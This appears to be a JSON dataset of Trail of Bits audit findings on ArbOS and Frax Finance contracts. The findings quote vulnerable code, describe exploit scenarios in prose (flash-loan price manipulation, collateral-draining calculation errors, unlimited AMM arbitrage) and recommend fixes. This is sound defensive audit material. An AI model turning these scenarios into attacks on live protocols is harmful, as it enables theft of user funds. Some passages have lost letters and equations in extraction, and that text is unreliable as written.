            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing ArbOS 20 gate on newly added GetScheduledUpgrade function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf",
        "body": "A new function, GetScheduledUpgrade, was added to the ArbOwnerPublic precompiled contract in ArbOS 20; however, it does not include an arbosVersion value to indicate that it is callable starting only from that ArbOS version. This could lead to state divergences when transactions are replayed during syncs. When a new function is added to a custom precompiled contract or when an altogether new precompiled contract is added in a new ArbOS version, that new function or contract must check that it cannot be called before it is activated. As shown in gure 2.1, the Precompiles function returns the precompiled contracts present in the system; each function in a precompiled contract has an associated arbosVersion, indicating the minimum, active ArbOS version necessary for the call to succeed. func Precompiles() map[addr]ArbosPrecompile { ... ArbOwnerPublic := insert(MakePrecompile(templates.ArbOwnerPublicMetaData, &ArbOwnerPublic{Address: hex(\"6b\")})) ArbOwnerPublic.methodsByName[\"GetInfraFeeAccount\"].arbosVersion = 5 ArbOwnerPublic.methodsByName[\"RectifyChainOwner\"].arbosVersion = 11 ArbOwnerPublic.methodsByName[\"GetBrotliCompressionLevel\"].arbosVersion = 20 ... } Figure 2.1: A snippet of the Precompiles function in precompile.go#L559-L562 The arbosVersion is not set for the GetScheduledUpgrade function, allowing transactions made on ArbOS versions prior to 20 to call it. Exploit Scenario Eve calls the GetScheduledUpgrade function in the ArbOwnerPublic precompiled contract before ArbOS 20 is activated, and the transaction correctly reverts. When ArbOS 20 is activated, the same transaction succeeds, leading to a state divergence. Recommendations Short term, make the GetScheduledUpgrade function present in the system starting only from ArbOS 20. Long term, add tests that attempt to call new functions added to precompiled contracts prior to the upgrade and ensure that a node can replay the historical transaction following an ArbOS upgrade without causing a state divergence. Note that this issue was discovered during week 1 of our review; Ochain xed the issue during the audit, and we incorporated that x into the scope of week 2.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Unclear implementations of MaxInitCodeSize and MaxCodeSize restrictions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf",
        "body": "The validations shown in gure 3.1 and gure 3.2 check that the length of msg.Data and the created contract are less than MaxInitCodeSize and MaxCodeSize, respectively. However, MaxInitCodeSize and MaxCodeSize are cast to signed integers; if they are set to values greater than 263, their signed representation will be negative; all inputs will succeed, given that their lengths will always be greater than a negative value. In practice, these checks would function the same if the lengths of msg.Data and the created contract were cast to an unsigned integer instead. This is because all possible length values will succeed up to the system and language runtimes memory limits if the limits are congured to 263. Nevertheless, it would be more clear to cast the slice lengths to an unsigned integer than to rely on this subtly. func (st *StateTransition) TransitionDb() (*ExecutionResult, error) { ... // Check whether the init code size has been exceeded. if rules.IsShanghai && contractCreation && len(msg.Data) > int(st.evm.ChainConfig().MaxInitCodeSize()) { return nil, fmt.Errorf(\"%w: code size %v limit %v\", ErrMaxInitCodeSizeExceeded, len(msg.Data), int(st.evm.ChainConfig().MaxInitCodeSize())) } ... } Figure 3.1: A snippet of the TransitionDb function in state_transition.go#L450-L453 func (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) { ... // Check whether the max code size has been exceeded, assign err if the case. if err == nil && evm.chainRules.IsEIP158 && len(ret) > int(evm.chainConfig.MaxCodeSize()) { err = ErrMaxCodeSizeExceeded } ... } Figure 3.2: A snippet of the create function in evm.go#L507-L510 Recommendations Short term, have the two aected functions cast the lengths of msg.Data and the created contract to an unsigned integer instead of MaxInitCodeSize and MaxCodeSize to a signed integer. Long term, when casting an unsigned integer to signed, always keep in mind that, depending on the values it can have, the cast value could have a negative sign. Additionally, when adding or changing conditions from the original go-ethereum codebase, make sure to add tests with values on the boundaries.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Rejection of unsupported transaction types is untested and fragile ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf",
        "body": "Since Arbitrum Nitro will not support the storage of blob data in ArbOS 20, blob transaction types are rejected, and a validation is used throughout the codebase that throws an error if such transaction types are used, as shown in gures 4.1, 4.2, and 4.3. However, this validation code is currently untested, and the implementation would be more robust and future-proof if it processed only transactions that are explicitly accepted instead. That way, if an unsupported transaction type is added in the upstream go-ethereum implementation, the Ochain team can consider what other changes may be necessary before allowing Arbitrum Nitro to accept it. if err := newTx.UnmarshalBinary(readBytes); err != nil { return nil, err } if newTx.Type() >= types.ArbitrumDepositTxType || newTx.Type() == types.BlobTxType { // Should be unreachable for Arbitrum types due to UnmarshalBinary not accepting Arbitrum internal txs // and we want to disallow BlobTxType since Arbitrum doesn't support EIP-4844 txs yet. return nil, types.ErrTxTypeNotSupported } Figure 4.1: Transaction types that are blacklisted (arbos/parse_l2.go#165172) if tx.Type() >= types.ArbitrumDepositTxType || tx.Type() == types.BlobTxType { // Should be unreachable for Arbitrum types due to UnmarshalBinary not accepting Arbitrum internal txs // and we want to disallow BlobTxType since Arbitrum doesn't support EIP-4844 txs yet. return types.ErrTxTypeNotSupported } Figure 4.2: Another place where the validation is used (nitro/execution/gethexec/sequencer.go#396400) if tx.Type() >= types.ArbitrumDepositTxType || tx.Type() == types.BlobTxType { // Should be unreachable for Arbitrum types due to UnmarshalBinary not accepting Arbitrum internal txs // and we want to disallow BlobTxType since Arbitrum doesn't support EIP-4844 txs yet. return types.ErrTxTypeNotSupported } Figure 4.3: Another place where the validation is used (nitro/execution/gethexec/tx_pre_checker.go#119123) Recommendations Short term, add tests to ensure this guard works as expected and to mitigate regressions. Long term, consider having the implementation explicitly accept certain transaction types so that it does not incidentally process unsupported transaction types following merges and upgrades from upstream. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Testing is not routine ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The Frax Solidity repository does not have reproducible tests that can be run locally. Having reproducible tests is one of the best ways to ensure a codebases functional correctness. This nding is based on the following events:    We tried to carry out the instructions in the Frax Solidity README at commit 31dd816 . We were unsuccessful. We reached out to Frax Finance for assistance. Frax Finance in turn pushed eight additional commits to the Frax Solidity repository (not counting merge commits). With these changes, we were able to run some of the tests, but not all of them. These events suggest that tests require substantial eort to run (as evidenced by the eight additional commits), and that they were not functional at the start of the assessment. Exploit Scenario Eve exploits a aw in a Frax Solidity contract. The aw would likely have been revealed through unit tests. Recommendations Short term, develop reproducible tests that can be run locally for all contracts. A comprehensive set of unit tests will help expose errors, protect against regressions, and provide a sort of documentation to users. Long term, incorporate unit testing into the CI process:   Run the tests specic to contract X when a push or pull request aects contract X. Run all tests before deploying any new code, including updates to existing contracts. Automating the testing process will help ensure the tests are run regularly and consistently.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. No clear mapping from contracts to tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "There are 405 Solidity les within the contracts folder 1 , but there are only 80 les within the test folder 2 . Thus, it is not clear which tests correspond to which contracts. The number of contracts makes it impractical for a developer to run all tests when working on any one contract. Thus, to test a contract eectively, a developer will need to know which tests are specic to that contract. Furthermore, as per TOB-FRSOL-001 , we recommend that the tests specic to contract X be run when a push or pull request aects contract X. To apply this recommendation, a mapping from the contracts to their relevant tests is needed. Exploit Scenario Alice, a Frax Finance developer, makes a change to a Frax Solidity contract. Alice is unable to determine the le that should be used to test the contract and deploys the contract untested. The contract is exploited using a bug that would have been revealed by a test. Recommendations Short term, for each contract, produce a list of tests that exercise that contract. If any such list is empty, produce tests for that contract. Having such lists will help facilitate contract testing following a change to it. Long term, as per TOB-FRSOL-001 , incorporate unit testing into the CI process by running the tests specic to contract X when a push or pull request aects contract X. Automating the testing process will help ensure the tests are run regularly and consistently. 1 find contracts -name '*.sol' | wc -l 2 find test -type f | wc -l",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. amoMinterBorrow cannot be paused ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The amoMinterBorrow function does not check for any of the paused ags or whether the minters associated collateral type is enabled. This reduces the FraxPoolV3 custodians ability to limit the scope of an attack. The relevant code appears in gure 3.1. The custodian can set recollateralizePaused[minter_col_idx] to true if there is a problem with recollateralization, and collateralEnabled[minter_col_idx] to false if there is a problem with the specic collateral type. However, amoMinterBorrow checks for neither of these. // Bypasses the gassy mint->redeem cycle for AMOs to borrow collateral function amoMinterBorrow ( uint256 collateral_amount ) external onlyAMOMinters { // Checks the col_idx of the minter as an additional safety check uint256 minter_col_idx = IFraxAMOMinter ( msg.sender ). col_idx (); // Transfer TransferHelper. safeTransfer (collateral_addresses[minter_col_idx], msg.sender , collateral_amount); } Figure 3.1: contracts/Frax/Pools/FraxPoolV3.sol#L552-L559 Exploit Scenario Eve discovers and exploits a bug in an AMO contract. The FraxPoolV3 custodian discovers the attack but is unable to stop it. The FraxPoolV3 owner is required to disable the AMO contracts. This occurs after signicant funds have been lost. Recommendations Short term, require recollateralizePaused[minter_col_idx] to be false and collateralEnabled[minter_col_idx] to be true for a call to amoMinterBorrow to succeed. This will help the FraxPoolV3 custodian to limit the scope of an attack. Long term, regularly review all uses of contract modiers, such as collateralEnabled . Doing so will help to expose bugs like the one described here.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Array updates are not constant time ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "In several places, arrays are allowed to grow without bound, and those arrays are searched linearly. If an array grows too large and the block gas limit is too low, such a search would fail. An example appears in gure 4.1. Minters are pushed to but never popped from minters_array . When a minter is removed from the array, its entry is searched for and then set to 0 . Note that the cost of such a search is proportional to the searched-for entrys index within the array. Thus, there will eventually be entries that cannot be removed under the current block gas limits because their positions within the array are too large. function removeMinter ( address minter_address ) external onlyByOwnGov { require (minter_address != address ( 0 ), \"Zero address detected\" ); require (minters[minter_address] == true , \"Address nonexistant\" ); // Delete from the mapping delete minters[minter_address]; // 'Delete' from the array by setting the address to 0x0 for ( uint i = 0 ; i < minters_array.length; i++){ if (minters_array[i] == minter_address) { minters_array[i] = address ( 0 ); // This will leave a null in the array and keep the indices the same break ; } } emit MinterRemoved (minter_address); } Figure 4.1: contracts/ERC20/__CROSSCHAIN/CrossChainCanonical.sol#L269-L285 Note that occasionally popping values from minters_array is not sucient to address the issue. An array can be popped from occasionally, yet its size can still be unbounded. A similar problem exists in CrossChainCanonical.sol with respect to bridge_tokens_array . This problem appears to exist in many parts of the codebase. Exploit Scenario Eve tricks Frax Finance into adding her minter to the CrosschainCanonical contract. Frax Finance later decides to remove her minter, but is unable to do so because minters_array has grown too large and block gas limits are too low. Recommendations Short term, enforce the following policy throughout the codebase: an arrays size is bounded, or the array is linearly searched, but never both. Arrays that grow without bound can be updated by moving computations, such as the computation of the index that needs to be updated, o-chain. Alternatively, the code that uses the array could be adjusted to eliminate the need for the array or to instead use a linked list. Adopting these changes will help ensure that the success of critical operations is not dependent on block gas limits. Long term, incorporate a check for this problematic code pattern into the CI pipeline. In the medium term, such a check might simply involve regular expressions. In the longer term, use Semgrep for Solidity if or when such support becomes stable. This will help to ensure the problem is not reintroduced into the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Incorrect calculation of collateral amount in redeemFrax ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The redeemFrax function of the FraxPoolV3 contract multiplies a FRAX amount with the collateral price to calculate the equivalent collateral amount (see the highlights in gure 5.1). This is incorrect. The FRAX amount should be divided by the collateral price instead. Fortunately, in the current deployment of FraxPoolV3 , only stablecoins are used as collateral, and their price is set to 1 (also see issue TOB-FRSOL-009 ). This mitigates the issue, as multiplication and division by one are equivalent. If the collateral price were changed to a value dierent from 1 , the exploit scenario described below would become possible, enabling users to steal all collateral from the protocol. if (global_collateral_ratio >= PRICE_PRECISION) { // 1-to-1 or overcollateralized collat_out = frax_after_fee .mul(collateral_prices[col_idx]) .div( 10 ** ( 6 + missing_decimals[col_idx])); // PRICE_PRECISION + missing decimals fxs_out = 0 ; } else if (global_collateral_ratio == 0 ) { // Algorithmic fxs_out = frax_after_fee .mul(PRICE_PRECISION) .div(getFXSPrice()); collat_out = 0 ; } else { // Fractional collat_out = frax_after_fee .mul(global_collateral_ratio) .mul(collateral_prices[col_idx]) .div( 10 ** ( 12 + missing_decimals[col_idx])); // PRICE_PRECISION ^2 + missing decimals fxs_out = frax_after_fee .mul(PRICE_PRECISION.sub(global_collateral_ratio)) .div(getFXSPrice()); // PRICE_PRECISIONS CANCEL OUT } Figure 5.1: Part of the redeemFrax function ( FraxPoolV3.sol#412433 ) When considering the    of an entity  , it is common to think of it as the amount of another entity  or  s per  . that has a value equivalent to 1  . The unit of measurement of    is   , For example, the price of one apple is the number of units of another entity that can be exchanged for one unit of apple. That other entity is usually the local currency. For the US, the price of an apple is the number of US dollars that can be exchanged for an apple:   = $  .  1. Given a    and an amount of    , one can compute the equivalent     through multiplication:    =     .    2. Given a    and an amount of    , one can compute the equivalent     through division: =       /   .  In short, multiply if the known amount and price refer to the same entity; otherwise, divide. The getFraxInCollateral function correctly follows rule 2 by dividing a FRAX amount by the collateral price to get the equivalent collateral amount (gure 5.2). function getFRAXInCollateral ( uint256 col_idx , uint256 frax_amount ) public view returns ( uint256 ) { return frax_amount.mul(PRICE_PRECISION).div( 10 ** missing_decimals[col_idx]). div(collateral_prices[col_idx]) ; } Figure 5.2: The getFraxInCollateral function ( FraxPoolV3.sol#242244 ) Exploit Scenario A collateral price takes on a value other than 1 . This can happen through either a call to setCollateralPrice or future modications that fetch the price from an oracle (also see issue TOB-FRSOL-009 ). A collateral asset is worth $1,000. Alice mints 1,000 FRAX for 1 unit of collateral. Alice then redeems 1,000 FRAX for 1 million units of collateral ( ). As a result, Alice has stolen around $1 billion from the protocol. If the calculation were 1000 / 1000 correct, Alice would have redeemed her 1,000 FRAX for 1 unit of collateral ( 1000  1000 ). Recommendations Short term, in FraxPoolV3.redeemFrax , use the existing getFraxInCollateral helper function (gure 5.2) to compute the collateral amount that is equivalent to a given FRAX amount. Long term, verify that all calculations involving prices use the above rules 1 and 2 correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. spotPriceOHM is vulnerable to manipulation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The OHM_AMO contract uses the Uniswap V2 spot price to calculate the value of the collateral that it holds. This price can be manipulated by making a large trade through the OHM-FRAX pool. An attacker can manipulate the apparent value of collateral and thereby change the collateralization rate at will. FraxPoolV3 appears to contain the most funds at risk, but any contract that uses FRAX.globalCollateralValue is susceptible to a similar attack. (It looks like Pool_USDC has buybacks paused, so it should not be able to burn FXS, at the time of writing.) function spotPriceOHM () public view returns ( uint256 frax_per_ohm_raw , uint256 frax_per_ohm ) { ( uint256 reserve0 , uint256 reserve1 , ) = (UNI_OHM_FRAX_PAIR.getReserves()); // OHM = token0, FRAX = token1 frax_per_ohm_raw = reserve1.div(reserve0); frax_per_ohm = reserve1.mul(PRICE_PRECISION).div(reserve0.mul( 10 ** missing_decimals_ohm)); } Figure 6.1: old_contracts/Misc_AMOs/OHM_AMO.sol#L174-L180 FRAX.globalCollateralValue loops through frax_pools_array , including OHM_AMO , and aggregates collatDollarBalance . The collatDollarBalance for OHM_AMO is calculated using spotPriceOHM and thus is vulnerable to manipulation. function globalCollateralValue() public view returns ( uint256 ) { uint256 total_collateral_value_d18 = 0 ; for ( uint i = 0 ; i < frax_pools_array.length; i++){ // Exclude null addresses if (frax_pools_array[i] != address ( 0 )){ total_collateral_value_d18 = total_collateral_value_d18.add(FraxPool(frax_pools_array[i]).collatDollarBalance()); } } return total_collateral_value_d18; } Figure 6.2: contracts/Frax/Frax.sol#L180-L191 buyBackAvailableCollat returns the amount the protocol will buy back if the aggregate value of collateral appears to back each unit of FRAX with more than is required by the current collateral ratio. Since globalCollateralValue is manipulable, the protocol can be articially forced into buying (burning) FXS shares and paying out collateral. function buybackAvailableCollat () public view returns ( uint256 ) { uint256 total_supply = FRAX.totalSupply(); uint256 global_collateral_ratio = FRAX.global_collateral_ratio(); uint256 global_collat_value = FRAX.globalCollateralValue(); if (global_collateral_ratio > PRICE_PRECISION) global_collateral_ratio = PRICE_PRECISION; // Handles an overcollateralized contract with CR > 1 uint256 required_collat_dollar_value_d18 = (total_supply.mul(global_collateral_ratio)).div(PRICE_PRECISION); // Calculates collateral needed to back each 1 FRAX with $1 of collateral at current collat ratio if (global_collat_value > required_collat_dollar_value_d18) { // Get the theoretical buyback amount uint256 theoretical_bbk_amt = global_collat_value.sub(required_collat_dollar_value_d18); // See how much has collateral has been issued this hour uint256 current_hr_bbk = bbkHourlyCum[curEpochHr()]; // Account for the throttling return comboCalcBbkRct(current_hr_bbk, bbkMaxColE18OutPerHour, theoretical_bbk_amt); } else return 0 ; } Figure 6.3: contracts/Frax/Pools/FraxPoolV3.sol#L284-L303 buyBackFXS calculates the amount of FXS to burn from the user, calls b urn on the FRAXShares contract, and sends the caller an equivalent dollar amount in USDC. function buyBackFxs ( uint256 col_idx , uint256 fxs_amount , uint256 col_out_min ) external collateralEnabled(col_idx) returns ( uint256 col_out ) { require (buyBackPaused[col_idx] == false , \"Buyback is paused\" ); uint256 fxs_price = getFXSPrice(); uint256 available_excess_collat_dv = buybackAvailableCollat(); // If the total collateral value is higher than the amount required at the current collateral ratio then buy back up to the possible FXS with the desired collateral require (available_excess_collat_dv > 0 , \"Insuf Collat Avail For BBK\" ); // Make sure not to take more than is available uint256 fxs_dollar_value_d18 = fxs_amount.mul(fxs_price).div(PRICE_PRECISION); require (fxs_dollar_value_d18 <= available_excess_collat_dv, \"Insuf Collat Avail For BBK\" ); // Get the equivalent amount of collateral based on the market value of FXS provided uint256 collateral_equivalent_d18 = fxs_dollar_value_d18.mul(PRICE_PRECISION).div(collateral_prices[col_idx]); col_out = collateral_equivalent_d18.div( 10 ** missing_decimals[col_idx]); // In its natural decimals() // Subtract the buyback fee col_out = (col_out.mul(PRICE_PRECISION.sub(buyback_fee[col_idx]))).div(PRICE_PRECISION); // Check for slippage require (col_out >= col_out_min, \"Collateral slippage\" ); // Take in and burn the FXS, then send out the collateral FXS.pool_burn_from( msg.sender , fxs_amount); TransferHelper.safeTransfer(collateral_addresses[col_idx], msg.sender , col_out); // Increment the outbound collateral, in E18, for that hour // Used for buyback throttling bbkHourlyCum[curEpochHr()] += collateral_equivalent_d18; } Figure 6.4: contracts/Frax/Pools/FraxPoolV3.sol#L488-L517 recollateralize takes collateral from a user and gives the user an equivalent amount of FXS, including a bonus. Currently, the bonus_rate is set to 0 , but a nonzero bonus_rate would signicantly increase the protability of an attack. // When the protocol is recollateralizing, we need to give a discount of FXS to hit the new CR target // Thus, if the target collateral ratio is higher than the actual value of collateral, minters get FXS for adding collateral // This function simply rewards anyone that sends collateral to a pool with the same amount of FXS + the bonus rate // Anyone can call this function to recollateralize the protocol and take the extra FXS value from the bonus rate as an arb opportunity function recollateralize( uint256 col_idx, uint256 collateral_amount, uint256 fxs_out_min) external collateralEnabled(col_idx) returns ( uint256 fxs_out) { require (recollateralizePaused[col_idx] == false , \"Recollat is paused\" ); uint256 collateral_amount_d18 = collateral_amount * ( 10 ** missing_decimals[col_idx]); uint256 fxs_price = getFXSPrice(); // Get the amount of FXS actually available (accounts for throttling) uint256 fxs_actually_available = recollatAvailableFxs(); // Calculated the attempted amount of FXS fxs_out = collateral_amount_d18.mul(PRICE_PRECISION.add(bonus_rate).sub(recollat_fee[col_idx]) ).div(fxs_price); // Make sure there is FXS available require (fxs_out <= fxs_actually_available, \"Insuf FXS Avail For RCT\" ); // Check slippage require (fxs_out >= fxs_out_min, \"FXS slippage\" ); // Don't take in more collateral than the pool ceiling for this token allows require (freeCollatBalance(col_idx).add(collateral_amount) <= pool_ceilings[col_idx], \"Pool ceiling\" ); // Take in the collateral and pay out the FXS TransferHelper.safeTransferFrom(collateral_addresses[col_idx], msg.sender , address ( this ), collateral_amount); FXS.pool_mint( msg.sender , fxs_out); // Increment the outbound FXS, in E18 // Used for recollat throttling rctHourlyCum[curEpochHr()] += fxs_out ; } Figure 6.5: contracts/Frax/Pools/FraxPoolV3.sol#L519-L550 Exploit Scenario FraxPoolV3.bonus_rate is nonzero. Using a ash loan, an attacker buys OHM with FRAX, drastically increasing the spot price of OHM. When FraxPoolV3.buyBackFXS is called, the protocol incorrectly determines that FRAX has gained additional collateral. This causes the pool to burn FXS shares and to send the attacker USDC of the equivalent dollar value. The attacker moves the price in the opposite direction and calls recollateralize on the pool, receiving and selling newly minted FXS, including a bonus, for prot. This attack can be carried out until the buyback and recollateralize hourly cap, currently 200,000 units, is reached. Recommendations Short term, take one of the following steps to mitigate this issue:   Call FRAX.removePool and remove OHM_AMO . Note, this may cause the protocol to become less collateralized. Call FraxPoolV3.setBbkRctPerHour and set bbkMaxColE18OutPerHour and rctMaxFxsOutPerHour to 0 . Calling toggleMRBR to pause USDC buybacks and recollateralizations would have the same eect. The implications of this mitigation on the long-term sustainability of the protocol are not clear. Long term, do not use the spot price to determine collateral value. Instead, use a time-weighted average price (TWAP) or an oracle such as Chainlink. If a TWAP is used, ensure that the underlying pool is highly liquid and not easily manipulated. Additionally, create a rigorous process to onboard collateral since an exploit of this nature could destabilize the system. References  samczsun, \"So you want to use a price oracle\"  euler-xyz/uni-v3-twap-manipulation",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Return values of the Chainlink oracle are not validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is a positive integer. An overow (e.g., uint(-1) ) would drastically misrepresent the price and cause unexpected behavior. In addition, FraxPoolV3 does not validate the completion and recency of the round data, permitting stale price data that does not reect recent changes. function getFRAXPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFRAXUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_frax_usd_decimals); } function getFXSPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFXSUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_fxs_usd_decimals); } Figure 7.1: contracts/Frax/Pools/FraxPoolV3.sol#231239 An older version of Chainlinks oracle interface has a similar function, latestAnswer . When this function is used, the return value should be checked to ensure that it is a positive integer. However, round information does not need to be checked because latestAnswer returns only price data. Recommendations Short term, add a check to latestRoundData and similar functions to verify that values are non-negative before converting them to unsigned integers, and add an invariant that checks that the round has nished and that the price data is from the current round: require(updatedAt != 0 && answeredInRound == roundID) . Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) . Furthermore, use consistent interfaces instead of mixing dierent versions. References  Chainlink AggregatorV3Interface",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Unlimited arbitrage in CCFrax1to1AMM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The CCFrax1to1AMM contract implements an automated market maker (AMM) with a constant price and zero slippage. It is a constant sum AMM that maintains the invariant  =  +  , where the token balances. must remain constant during swaps (ignoring fees) and and    are Constant sum AMMs are impractical because they are vulnerable to unlimited arbitrage. If the price dierence of the AMMs tokens in external markets is large enough, the most protable arbitrage strategy is to buy the total reserve of the more expensive token from the AMM, leaving the AMM entirely imbalanced. Other AMMs like Uniswap and Curve prevent unlimited arbitrage by making the price depend on the reserves. This limits prots from arbitrage to a fraction of the total reserves, as the price will eventually reach a point at which the arbitrage opportunity disappears. No such limit exists in the CCFrax1to1AMM contract. While arbitrage opportunities are somewhat limited by the token caps, fees, and gas prices, unlimited arbitrage is always possible once the reserves or the dierence between the FRAX price and the token price becomes large enough. While token_price swings are limited by the price_tolerance parameter, frax_price swings are not limited. Exploit Scenario The CCFrax1to1AMM contract is deployed, and price_tolerance is set to 0.05. A token  is whitelisted with a token_cap of 100,000 and a swap_fee of 0.0004. A user transfers 100,000 FRAX to an AMM. The price of minimum at which the AMM allows swaps, and the price of FRAX in an external market becomes 1.005. Alice buys (or takes out a ash loan of) $100,000 worth of market. Alice swaps all of her external market, making a prot of $960. No FRAX remains in the AMM. in the external for FRAX with the AMM and then sells all of her FRAX in the in an external market becomes 0.995, the    This scenario is conservative, as it assumes a balance of only 100,000 FRAX and a frax_price of 1.005. As frax_price and the balance increase, the arbitrage prot increases. Recommendations Short term, do not deploy CCFrax1to1AMM and do not fund any existing deployments with signicant amounts. Those funds will be at risk of being drained through arbitrage. Long term, when providing stablecoin-to-stablecoin liquidity, use a Curve pool or another proven and audited implementation of the stableswap invariant.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Collateral prices are assumed to always be $1 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "In the FraxPoolV3 contract, the setCollateralPrice function sets collateral prices and stores them in the collateral_prices mapping. As of December 13, 2021, collateral prices are set to $1 for all collateral types in the deployed version of the FraxPoolV3 contract. Currently, only stablecoins are used as collateral within the Frax Protocol. For those stablecoins, $1 is an appropriate price approximation, at most times. However, when the actual price of the collateral diers enough from $1, users could choose to drain value from the protocol through arbitrage. Conversely, during such price uctuations, other users who are not aware that FraxPoolV3 assumes collateral prices are always $1 can receive less value than expected. Collateral tokens that are not pegged to a specic value, like ETH or WBTC, cannot currently be used safely within FraxPoolV3 . Their prices are too volatile, and repeatedly calling setCollateralPrice is not a feasible solution to keeping their prices up to date. Exploit Scenario The price of FEI, one of the stablecoins collateralizing the Frax Protocol, changes to $0.99. Alice, a user, can still mint FRAX/FXS as if the price of FEI were $1. Ignoring fees, Alice can buy 1 million FEI for $990,000, mint 1 million FRAX/FXS with the 1 million FEI, and sell the 1 million FRAX/FXS for $1 million, making $10,000 in the process. As a result, the Frax Protocol loses $10,000. If the price of FEI changes to $1.01, Bob would expect that he can exchange his 1 million FEI for 1.01 million FRAX/FXS. Since FraxPoolV3 is not aware of the actual price of FEI, Bob receives only 1 million FRAX/FXS, incurring a 1% loss. Recommendations Short term, document the arbitrage opportunities described above. Warn users that they could lose funds if collateral prices dier from $1. Disable the option to set collateral prices to values not equal to $1. Long term, modify the FraxPoolV3 contract so that it fetches collateral prices from a price oracle.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "Frax Finance has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc -js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Frax Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Users are unable to limit the amount of collateral paid to FraxPoolV3 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The amount of collateral and FXS that is paid by the user in mintFrax is dynamically computed from the collateral ratio and price. These parameters can change between transaction creation and transaction execution. Users currently have no way to ensure that the paid amounts are still within acceptable limits at the time of transaction execution. Exploit Scenario Alice wants to call mintFrax . In the time between when the transaction is broadcast and executed, the global collateral ratio, collateral, and/or FXS prices change in such a way that Alice's minting operation is no longer protable for her. The minting operation is still executed, and Alice loses funds. Recommendations Short term, add the maxCollateralIn and maxFXSIn parameters to mintFrax , enabling users to make the transaction revert if the amount of collateral and FXS that they would have to pay is above acceptable limits. Long term, always add such limits to give users the ability to prevent unacceptably large input amounts and unacceptably small output amounts when those amounts are dynamically computed.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Incorrect default price tolerance in CCFrax1to1AMM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
